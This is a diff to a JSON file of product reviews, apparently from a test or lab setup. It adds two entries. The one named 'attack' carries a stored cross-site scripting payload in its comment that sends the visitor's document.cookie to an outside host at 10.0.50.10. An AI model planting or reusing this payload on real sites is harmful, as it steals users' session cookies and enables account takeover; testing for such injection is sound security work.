@@ -1,1 +1,18 @@
-[]
+[
+  {
+    "id": 1,
+    "product_id": 10,
+    "name": "test",
+    "rating": 5,
+    "comment": "<b>test</b>",
+    "created_at": "2026-01-29T15:03:09.198Z"
+  },
+  {
+    "id": 2,
+    "product_id": 10,
+    "name": "attack",
+    "rating": 5,
+    "comment": "Great product! <script>new Image().src='http://10.0.50.10/log?c=' + document.cookie;</script",
+    "created_at": "2026-01-29T15:03:24.499Z"
+  }
+]
